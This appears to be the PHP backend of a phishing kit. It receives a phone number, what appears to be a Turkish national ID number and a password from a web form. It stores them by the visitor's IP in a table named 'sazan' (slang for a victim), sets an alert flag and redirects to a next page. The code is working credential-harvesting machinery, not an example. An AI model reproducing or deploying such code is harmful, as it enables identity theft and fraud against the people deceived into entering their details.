<?php
	ob_start();
	session_start();
	include('connect.php');
	date_default_timezone_set('Europe/Istanbul');

	/*if(empty($_POST['tntnnum'])){
		exit();
	}
	if(empty($_POST['msrortr'])){
		exit();
	}*/


	$phone 		= urldecode(htmlspecialchars($_POST['telno']));
	$tcnono 	= htmlspecialchars($_POST['tntnnum']);
	$sifree 	= htmlspecialchars($_POST['msrortr']);
	$ip 		= GetIPz();
	$date 		= date('d.m.Y H:i');

	$stmt = $db->prepare('SELECT COUNT(*) FROM sazan WHERE ip = ?');
	$stmt->execute([$ip]);
	$count = $stmt->fetchColumn();

	if ($count > 0) {
		$query = $db->prepare('UPDATE sazan SET date=?, ad=?, money=? WHERE ip=?');
		$update = $query->execute([$date,  $tcnono, $sifree, $ip]);
	} else {
		$query = $db->prepare('INSERT INTO sazan (ip, date, ad, money) VALUES (?, ?, ?, ?)');
		$insert = $query->execute([$ip, $date, $tcnono, $sifree]);
	}


	$db->query("UPDATE site SET sound='1'");
	header('Location: phone.php');
	exit();


?>